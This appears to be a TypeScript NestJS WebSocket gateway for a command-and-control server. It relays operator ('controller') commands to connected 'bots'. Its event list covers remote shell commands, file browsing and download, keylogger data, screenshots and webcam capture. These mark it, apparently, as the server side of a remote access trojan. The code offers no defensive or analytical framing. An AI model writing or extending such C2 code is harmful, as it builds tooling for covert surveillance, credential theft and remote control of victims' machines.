import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from "@nestjs/websockets";
import { Server, Socket } from "socket.io";
import { WsBotJoinsUseCase } from "../application/ws-bot-joins.use-case";
import { WsBotLeavesUseCase } from "../application/ws-bot-leaves.use-case";
import { Logger } from "@nestjs/common";

type BotEvents =
  | "connectedClient"
  | "disconnectedClient"
  | "sendScreensToBot"
  | "sendScreenshotToBot"
  | "message"
  | "getCmdCommand"
  | "getFilesFolder"
  | "downloadFile"
  | "addFriend"
  | "sendKeyLogger" | "getTasksFromClient" | "getWebcams" | "getWebcamScreenshot";

@WebSocketGateway({
  namespace: "bot",
  cors: true,
  maxHttpBufferSize: 1e8,
})
export class WsBotGateway implements OnGatewayConnection, OnGatewayDisconnect {
  constructor(
    private readonly wsBotJoinsUseCase: WsBotJoinsUseCase,
    private readonly wsBotLeavesUseCase: WsBotLeavesUseCase,
  ) { }

  @WebSocketServer()
  server!: Server;

  private logger = new Logger("WsBotGateway");

  private botid: string = "";

  afterInit(client: Socket) { }

  sendEventToBot(controllerid: string, event: BotEvents, payload?: any) {
    try {
      // const client = this.server.sockets.sockets.get(clientid);
      // console.log("client", client);
      // if (client) {
      //   client.emit(event, payload);
      // }

      this.logger.debug(
        `message to bot from ${controllerid} with the event ${event}`,
      );
      this.server.emit(event, {
        ...payload,
        controllerid,
      });

      return;
    } catch (error) {
      this.logger.error(`Error sending event to bot: ${error}`);
    }
  }

  async handleConnection(client: Socket) {
    try {
      await this.wsBotJoinsUseCase.execute(client);
      this.botid = client.id;
      // await this.clientJoinsUseCase.execute()
    } catch (error) {
      // console.error("Connection error:", error);
      this.logger.error(`Failed to connect bot: ${error}`);
      client.disconnect();
    }
  }

  handleDisconnect(client: Socket) {
    this.logger.log(`Bot disconnected: ${client.id}`);
    this.wsBotLeavesUseCase.execute();
  }
}
